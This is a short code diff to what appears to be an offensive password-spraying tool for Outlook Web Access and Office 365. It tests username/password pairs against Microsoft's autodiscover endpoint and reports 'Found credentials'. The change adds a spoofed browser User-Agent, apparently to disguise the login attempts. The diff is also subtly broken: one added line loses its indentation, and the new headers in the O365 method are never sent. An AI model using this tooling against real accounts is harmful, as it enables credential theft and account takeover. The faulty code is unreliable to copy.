@@ -61,7 +61,7 @@ class OWA:
 
     def get_owa_domain(self, url):
         # Stolen from https://github.com/dafthack/MailSniper
-        auth_header = {"Authorization": "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
+    auth_header = {"Authorization": "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"}
         r = requests.post(url, headers=auth_header, verify=False)
         if r.status_code == 401:
             ntlm_info = ntlmdecode(r.headers["WWW-Authenticate"])
@@ -87,7 +87,7 @@ class OWA:
     def auth_O365(self, username, password):
         log = logging.getLogger(f"auth_owa_O365({username})")
 
-        headers = {"Content-Type": "text/xml"}
+        headers = {"Content-Type": "text/xml", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"}
         r = requests.get("https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", auth=(username, password), verify=False)
         if r.status_code == 200:
             log.info(print_good(f"Found credentials: {username}:{password}"))
